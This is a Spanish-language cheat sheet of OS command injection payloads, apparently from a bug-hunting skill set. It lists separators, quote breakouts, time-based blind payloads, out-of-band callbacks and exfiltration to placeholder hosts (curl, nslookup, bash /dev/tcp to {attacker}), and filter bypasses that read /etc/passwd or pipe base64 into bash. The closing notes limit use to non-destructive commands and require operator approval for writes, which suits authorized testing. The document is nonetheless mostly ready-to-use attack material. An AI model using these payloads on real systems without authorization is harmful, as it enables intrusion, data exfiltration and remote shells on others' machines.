# OS Command Injection Payloads

> Ver `skills/hunt/rce`. Evidencia: output de comando no destructivo
> (`id`, `hostname`) en respuesta, timing consistente, o callback OOB.

## Separadores (Unix)

```
; id
| id
|| id                    -- si el primero falla
&& id
`id`
$(id)
%0a id                   -- newline literal
id%0a                    -- newline al inicio
```

## Separadores (Windows)

```
& whoami
| whoami
|| whoami
&& whoami
%0a whoami
```

## Contextos con quoting

```
'; id; echo '            -- cierra comilla simple
"; id; echo "            -- comilla doble
'; id #                  -- comentario tras inyección
';$(id);'                -- anidado
```

## Blind — time-based (3+ repeticiones consistentes)

```
; sleep 5
| sleep 5
$(sleep 5)
& timeout /T 5           -- Windows
; ping -c 5 127.0.0.1    -- cuando sleep está filtrado
```

## Blind — OOB (preferido: evidencia inequívoca, ver oob-interactions)

```
; curl https://{TOKEN}.oast.host/
; wget https://{TOKEN}.oast.host/
; nslookup {TOKEN}.oast.host
; ping -c 1 {TOKEN}.oast.host        -- DNS lookup ya es señal (tier 3)
& powershell -c "Invoke-WebRequest https://{TOKEN}.oast.host"   -- Windows
; bash -c "id > /dev/tcp/{attacker}/4444"    -- exfil de output vía TCP
```

## Exfil de datos vía OOB

```
; curl https://{TOKEN}.oast.host/?d=$(id|base64)
; nslookup $(whoami).{TOKEN}.oast.host
& for /f %i in ('whoami') do nslookup %i.{TOKEN}.oast.host     -- Windows
```

## Filter bypass

```
c''at /etc/passwd        -- comillas vacías rompen keywords
c\at /etc/passwd
$@cat /etc/passwd        -- $@ expande a nada
c${IFS}at${IFS}/etc/passwd    -- IFS como espacio
cat</etc/passwd
echo "aWQ="|base64 -d|bash   -- comando completo en base64
/p??/c?t /etc/passwd     -- globbing
```

## Gotchas de uso

- Delay ≠ ejecución: descartar latencia de red con 3+ mediciones y un
  control (mismo request sin payload).
- OOB es la evidencia más limpia para blind — preferir sobre timing.
- Comandos NO destructivos solamente: `id`, `whoami`, `hostname`, `uname -a`.
  Cualquier escritura en el target requiere gate de operador.
